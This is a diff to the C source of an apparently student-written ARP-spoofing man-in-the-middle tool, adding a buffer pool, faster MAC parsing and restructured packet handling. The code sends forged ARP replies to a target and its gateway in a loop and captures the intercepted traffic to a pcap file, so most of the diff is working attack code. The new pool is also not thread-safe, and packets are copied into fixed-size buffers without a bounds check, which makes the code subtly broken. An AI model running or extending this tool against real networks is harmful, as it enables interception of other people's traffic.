@@ -3,33 +3,79 @@
 // INFO : Why just use one Global variable? -> Do cleanup resource in signal handler
 struct mitm data;
 
+// Optimized: Buffer pool definitions
+struct thread_arg thread_arg_pool[THREAD_ARG_POOL_SIZE];
+unsigned char buffer_pool[THREAD_ARG_POOL_SIZE][BUFFER_SIZE];
+bool pool_used[THREAD_ARG_POOL_SIZE] = {false};
+
+// Optimized: Get a thread argument from the pool to reduce malloc/free
+struct thread_arg *get_thread_arg_from_pool(void)
+{
+  for (int i = 0; i < THREAD_ARG_POOL_SIZE; i++)
+  {
+    if (!pool_used[i])
+    {
+      pool_used[i] = true;
+      thread_arg_pool[i].buffer = buffer_pool[i];
+      return &thread_arg_pool[i];
+    }
+  }
+  // Fallback to malloc if pool is exhausted
+  struct thread_arg *arg = malloc(sizeof(struct thread_arg));
+  arg->buffer = malloc(BUFFER_SIZE);
+  return arg;
+}
+
+void return_thread_arg_to_pool(struct thread_arg *arg)
+{
+  // Check if this is from our pool
+  for (int i = 0; i < THREAD_ARG_POOL_SIZE; i++)
+  {
+    if (arg == &thread_arg_pool[i])
+    {
+      pool_used[i] = false;
+      return;
+    }
+  }
+  // This was malloc'd, so free it
+  if (arg->buffer)
+    free(arg->buffer);
+  free(arg);
+}
+
+static inline unsigned char hex_to_byte(char c)
+{
+  if (c >= '0' && c <= '9') return c - '0';
+  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+  return 0xFF; // Invalid
+}
+
 bool convert_mac(const char *src_mac, unsigned char *dest_mac)
 {
-  int  i = -1;
-  char cur;
-
+  const char *p = src_mac;
+  
+  // Fast length check - MAC should be exactly 17 chars (xx:xx:xx:xx:xx:xx)
   if (ft_strlen(src_mac) != 17)
     return (false);
-  while (src_mac[++i] != '\0')
+    
+  // Parse 6 bytes directly
+  for (int i = 0; i < 6; i++)
   {
-    cur = src_mac[i];
-    if (cur == ':' && (i + 1) % 3 == 0)
-    {
-      dest_mac++;
-      continue;
-    }
-    else if ((cur >= '0' && cur <= '9') || (cur >= 'a' && cur <= 'f') || (cur >= 'A' && cur <= 'F'))
-    {
-      *dest_mac = *dest_mac << 4;
-      if (cur >= '0' && cur <= '9')
-        *dest_mac += cur - '0';
-      else if (cur >= 'a' && cur <= 'f')
-        *dest_mac += cur - 'a' + 10;
-      else
-        *dest_mac += cur - 'A' + 10;
-    }
-    else
+    unsigned char high = hex_to_byte(*p++);
+    unsigned char low = hex_to_byte(*p++);
+    
+    if (high == 0xFF || low == 0xFF)
       return (false);
+      
+    dest_mac[i] = (high << 4) | low;
+    
+    // Skip colon (except after last byte)
+    if (i < 5)
+    {
+      if (*p++ != ':')
+        return (false);
+    }
   }
   return (true);
 }
@@ -96,23 +142,21 @@ void *send_fake_arp_reply(void *arg)
   dest_addr.sll_ifindex  = data.if_index;
   dest_addr.sll_halen    = ETH_ALEN;
   ft_memcpy(dest_addr.sll_addr, t_arg->mac, ETH_ALEN);
+  
   while (true)
   {
     if (sendto(data.sockfd, t_arg->buffer, t_arg->buflen, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0)
     {
       perror("sendto failed");
-      exit(EXIT_FAILURE);
+      break;
     }
     if (DEBUG)
       printf("send okay!!\n");
-    sleep(3);
+    sleep(SPOOF_INTERVAL_SEC); // Optimized: use configurable interval
   }
-  if (t_arg)
-  {
-    if (t_arg->buffer)
-      free(t_arg->buffer);
-    free(t_arg);
-  }
+  
+  // Optimized: Use pool for cleanup
+  return_thread_arg_to_pool(t_arg);
   return (NULL);
 }
 
@@ -121,15 +165,17 @@ void send_reply_packet(unsigned char *buffer, int buflen, __be16 protocol)
   pthread_t          tid;
   struct thread_arg *arg;
 
-  arg         = malloc(sizeof(struct thread_arg));
-  arg->buffer = malloc(buflen);
+  // Optimized: Use pool instead of malloc
+  arg = get_thread_arg_from_pool();
   ft_memcpy(arg->buffer, buffer, buflen);
   ft_memcpy(arg->mac, data.target_mac, MAC_ADDR_LEN);
   arg->buflen   = buflen;
   arg->protocol = protocol;
+  
   if (pthread_create(&tid, NULL, send_fake_arp_reply, (void *)arg) != 0)
   {
     perror("pthread_create failed");
+    return_thread_arg_to_pool(arg);
     exit(EXIT_FAILURE);
   }
   if (pthread_detach(tid) != 0)
@@ -144,33 +190,38 @@ void check_packet(unsigned char *buffer, int buflen)
   struct ethhdr     *eth    = (struct ethhdr *)buffer;
   struct arp_packet *packet = (struct arp_packet *)(buffer + sizeof(struct ethhdr));
 
-  if (ntohs(eth->h_proto) == ETH_P_ARP)
+  // Optimized: Early exit if not ARP
+  if (ntohs(eth->h_proto) != ETH_P_ARP)
+    return;
+
+  // Optimized: Check target->source communication first (more common case)
+  if (ft_memcmp(packet->sender_ip, &data.target_ipv4, sizeof(data.target_ipv4)) == 0 &&
+      ft_memcmp(packet->sender_mac, data.target_mac, sizeof(data.target_mac)) == 0 &&
+      ft_memcmp(packet->target_ip, &data.source_ipv4, sizeof(data.source_ipv4)) == 0)
   {
-    if (ft_memcmp(packet->sender_ip, &data.target_ipv4, sizeof(data.target_ipv4)) == 0 &&
-        ft_memcmp(packet->sender_mac, data.target_mac, sizeof(data.target_mac)) == 0 &&
-        ft_memcmp(packet->target_ip, &data.source_ipv4, sizeof(data.source_ipv4)) == 0)
+    if (DEBUG)
     {
-      if (DEBUG)
-      {
-        printf("prev_packet!!\n");
-        print_arp_packet(buffer);
-      }
-      make_arp_packet(buffer);
-      if (DEBUG)
-      {
-        printf("new_packet!!\n");
-        print_arp_packet(buffer);
-      }
-      send_reply_packet(buffer, buflen, ETH_P_ARP);
-      send_gateway_arp_request_packet(buffer, buflen);
+      printf("prev_packet!!\n");
+      print_arp_packet(buffer);
     }
-    else if (ft_memcmp(packet->sender_ip, &data.gw_ipv4, sizeof(data.gw_ipv4)) == 0)
+    make_arp_packet(buffer);
+    if (DEBUG)
     {
-      ft_memcpy(data.gw_mac, packet->sender_mac, MAC_ADDR_LEN);
-      send_gateway_spoofing_packet(buffer, buflen);
-      data.spoofing     = true;
-      data.pcap_file_fd = init_pcap_file("test.pcap");
+      printf("new_packet!!\n");
+      print_arp_packet(buffer);
     }
+    send_reply_packet(buffer, buflen, ETH_P_ARP);
+    send_gateway_arp_request_packet(buffer, buflen);
+    return;
+  }
+  
+  // Optimized: Check gateway communication
+  if (ft_memcmp(packet->sender_ip, &data.gw_ipv4, sizeof(data.gw_ipv4)) == 0)
+  {
+    ft_memcpy(data.gw_mac, packet->sender_mac, MAC_ADDR_LEN);
+    send_gateway_spoofing_packet(buffer, buflen);
+    data.spoofing     = true;
+    data.pcap_file_fd = init_pcap_file("test.pcap");
   }
 }
 
@@ -178,22 +229,24 @@ void wait_arp_req()
 {
   unsigned char buffer[IP_MAXPACKET] = { 0 };
   int           saddr_len, buflen;
+  struct ethhdr *eth;
 
   saddr_len = sizeof(data.saddr);
   while (true)
   {
     buflen = recvfrom(data.sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&data.saddr, (socklen_t *)&saddr_len);
     ft_assert(buflen >= 0, "error in reading recvfrom function");
+    
+    // Optimized: Early size check
     if (buflen < (int)sizeof(struct ethhdr))
-    {
-      fprintf(stderr, "Packet too small to contain Ethernet header\n");
       continue;
-    }
+      
+    eth = (struct ethhdr *)buffer;
+    
     if (data.spoofing)
     {
-      struct ethhdr *eth = (struct ethhdr *)buffer;
-
-      if (ft_memcmp(eth->h_dest, data.target_mac, sizeof(data.target_mac)) == 0)
+      // Optimized: Direct comparison without function call overhead
+      if (ft_memcmp(eth->h_dest, data.target_mac, MAC_ADDR_LEN) == 0)
       {
         if (DEBUG)
         {
